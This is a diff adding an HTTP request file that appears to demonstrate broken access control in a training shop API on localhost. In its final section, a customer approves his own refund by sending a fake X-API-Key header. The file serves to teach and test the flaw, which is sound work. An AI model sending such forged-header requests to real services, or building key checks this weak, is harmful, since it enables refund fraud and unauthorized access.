@@ -1,0 +1,66 @@
+@base = http://localhost:8000/api/v203
+
+POST {{base}}/auth/login
+Content-Type: application/json
+
+{
+    "email": "plankton@chum-bucket.sea",
+    "password": "i_love_my_wife"
+}
+
+### Create a new cart and add items to it
+# @name cart
+POST {{base}}/cart
+Authorization: Basic plankton@chum-bucket.sea:i_love_my_wife
+
+### Add items to the cart
+POST {{base}}/cart/{{cart.response.body.cart_id}}/items
+Authorization: Basic plankton@chum-bucket.sea:i_love_my_wife
+Content-Type: application/json
+
+{
+  "item_id": "6"
+}
+
+### Checkout the cart
+# @name order
+POST {{base}}/cart/{{cart.response.body.cart_id}}/checkout
+Authorization: Basic plankton@chum-bucket.sea:i_love_my_wife
+Content-Type: application/x-www-form-urlencoded
+
+tip=1&delivery_address=Chum Backet Restaurant
+
+### Now Plankton wants to refund his order total
+POST {{base}}/orders/{{order.response.body.order_id}}/refund
+Authorization: Basic plankton@chum-bucket.sea:i_love_my_wife
+Content-Type: application/x-www-form-urlencoded
+
+amount=26.50
+
+### Legitimate request: Restaurant manager rejects Plankton's refund request
+PATCH {{base}}/orders/{{order.response.body.order_id}}/refund/status
+X-API-Key: key-mrkrabs-1bd647c2-dc5b-4c2b-a316-5ff83786c219
+Content-Type: application/x-www-form-urlencoded
+
+status=rejected
+
+### Check the refund status: his request was rejected
+GET {{base}}/orders/{{order.response.body.order_id}}/refund/status
+Authorization: Basic plankton@chum-bucket.sea:i_love_my_wife
+
+# --- Vulnerable Example ---
+
+### Vulnerable Example: Plankton can approve his own refund request by sending a fake X-API-Key header
+PATCH {{base}}/orders/{{order.response.body.order_id}}/refund/status
+X-API-Key: fake
+Content-Type: application/x-www-form-urlencoded
+
+status=approved
+
+### Check the refund status: his request is now approved!
+GET {{base}}/orders/{{order.response.body.order_id}}/refund/status
+Authorization: Basic plankton@chum-bucket.sea:i_love_my_wife
+
+### We see that Plankton's balance is increased by the refund amount! 
+GET {{base}}/account/info
+Authorization: Basic plankton@chum-bucket.sea:i_love_my_wife
